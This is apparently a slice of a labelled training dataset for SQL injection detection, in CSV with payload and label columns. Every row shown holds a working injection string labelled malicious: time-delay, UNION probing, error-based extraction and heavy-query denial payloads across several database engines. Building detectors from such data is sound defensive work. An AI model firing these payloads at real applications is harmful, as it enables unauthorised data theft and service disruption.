row_index,payload_norm,label,sqli_type_hint
900,1 ) ) as pzoo where 8036 = 8036 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1,
901,-2120' ) or 8734 = 8844#,1,
902,"1"" ) ) as lomw where 9257 = 9257 union all select null,null,null,null,null,null--",1,
903,"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
904,"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",1,
905,1 ) and 4595 = 4595#,1,
906,"-4984%"" ) ) ) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1,
907,"-5224' ) where 1962 = 1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1,
908,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,
909,"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",1,
910,"1"" ) ) ) union all select null,null,null,null,null--",1,
911,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'xmnd' = 'xmnd",1,
912,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",1,
913,"-3721' ) union all select 9050,9050--",1,
914,"1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
915,"1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
916,1%' ) order by 1--,1,
917,"-9281 ) where 8363 = 8363 or make_set ( 8220 = 5127,5127 ) --",1,
918,"1"" ) where 6671 = 6671 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
919,"end and ( ""vwbx"" = ""vwbx",1,
920,"1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
921,1' ) ) rlike sleep ( 5 ) and ( ( 'iwct' = 'iwct,1,
922,"-9087"" order by 1#",1,
923,-7562 ) or 8571 = 8571--,1,
924,"-3707"" ) ) ) or 8571 = 8571--",1,
925,1'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',1,
926,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",1,
927,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,
928,"1"" ) ) as vbpl where 3885 = 3885 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",1,
929,select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,1,
